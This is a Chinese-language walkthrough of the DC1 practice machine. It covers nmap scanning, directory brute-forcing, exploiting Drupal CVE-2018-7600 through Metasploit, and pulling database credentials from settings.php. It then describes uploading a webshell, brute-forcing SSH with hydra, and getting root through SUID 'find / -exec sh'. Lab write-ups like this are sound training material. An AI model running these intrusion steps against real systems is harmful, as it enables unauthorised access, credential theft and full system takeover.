# DC1   
## 简述  
使用目录进行爆破，发现drupal的版本，使用一个rce执行之后拿到数据库的密码，上传webshell ，使用带有suid的命令进行提权  
 
简述 drupal7.x 其中存在exp，提权使用root的带有suid的命令进行提权【服务配置错误】
难点 查询服务 查询漏洞 带s位的命令执行  find命令的执行  
## 探测&&利用漏洞  
1. 首先探测服务  
   使用nmap -sP(使用ping命令进行扫描) -PR (使用arp协议进行扫描) 网段名  
 ![20211016235009](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211016235009.png)
   之后使用nmap -A -p 1-10000 ipaddr 对ip地址开启的服务进行扫描  
 ![20211016235020](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211016235020.png)
   发现开启了ssh和web服务进行访问
   
2. 对子目录进行爆破  
python3 dirsearch.py -e php -u  192.168.1.47
访问robots.txt文件得到子目录当中的信息，发现其中的upgradee.txt从而指导了版本号  
![20211016235033](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211016235033.png)

![20211016235044](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211016235044.png)
 通过版本号发现一个rce漏洞 CVE2018-7600   
 ![20211016235052](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211016235052.png)
 配置好参数使用这个漏洞利用   
 配置如下  
 ![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200201014658.png)  
使用msf得到权限，  
## 提权  
```
python -c 'import pty;pty.spawn("/bin/bash")' 
```
拿到交互式的shell  
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200201015033.png)

提权第一要素，收集服务器当中的文件数据  
**第一个flag提示我们寻求配置文件**
![20211016235104](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211016235104.png)
这里自我寻找了很久都没有寻找到，最后寻找到的方法是通过百度才知道。这里寻找的文件在/sites/default/settings.php 是配置数据库的默认文件
**第二个flag提示我们处理现在有的密码和用户名**
![20211016235112](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211016235112.png)
拿到数据库的配置密码，或者可以直接使用
寻找第三个flag的一直找不到，然后通过搜索到是存储在mysql的node当中的。
在drupal当中的数据会存贮在node当中，就像这个靶机一样  
```
后面我才知道该死的drupal是将数据存在node其中的  
我之前一直以为不是。。。。
而在drupal当中node在数据库的field_data_body表  
```
详细步骤  
![20211016235132](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211016235132.png)

3. 上传webshell 使用冰蝎连接  
![20211016235150](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211016235150.png)
   发现其中的数据库修改是存在很大问题的只能是修改一部分的数据    所以这里暂时没有用到
   

 **第三个flag提示我们使用寻找使用exec权限**  
4. 使用hydra进行爆破   
   ![20211016235204](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211016235204.png)
   hydra -l flag4 -P pass.list ip ssh  
   ![20191120161610.png](https://i.loli.net/2019/11/20/WDjs74NEZ982rKO.png)   
   **第四个flag提示我们使用相同的权限寻求权限**  
  ![20211016235217](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211016235217.png)
5. 使用ssh连接上之后用suid提取方法进行提权  
   查找带有s位的命令    
   find / -perm -u=s -type f 2>/dev/null  
   ![20211016235230](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211016235230.png)  
   原理就是执行带s位的命令的时候会有root的权限，使用find命令，touch命令任意创建一个文件进行执行exec命令  
```
find / -type f -name s -exec "whoami" \;   
这个命令的原理  
find命令如果是配置成使用SUID权限运行的时候，则可以通过find命令以root身份去运行  
 提权命令
find / -exec sh \; 使用exec执行sh拿到权限 
```


![20211016235250](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211016235250.png)
### 使用到的命令  
**探测主机**  
```
nmap -sP -PR ip段  
```
**探测服务** 
```
nmap -A -p 1-10000 ipaddr  
```
**子目录爆破**  
```
python3 dirsearch.py -e php -u  ipaddr  
```
**python创建交互式shell**  
```
python -c 'import pty;pty.spawn("/bin/bash")'  #创建交互式shell  
python创建 创建交互式shell成功之后 将交互式shell通过shell 反弹给宿主  【主要原因是在会话当中的交互式shell并不如python当中的交互式shell那般】
```
**find提权**  
```
find / -exec sh \; 使用exec执行sh拿到权限 
```
## 总结
前期踩点，爆破目录搜索到版本号  
searchsploit或者msfconsole搜索漏洞利用  
拿到网站最低权限之后翻看配置文件拿到数据库的配置文件  
通过错误的配置suid命令拿到root权限  

## referer
https://drupal.stackexchange.com/questions/6787/where-is-the-content-of-a-nodes-body-stored#comment6998_6788
https://www.anquanke.com/post/id/86979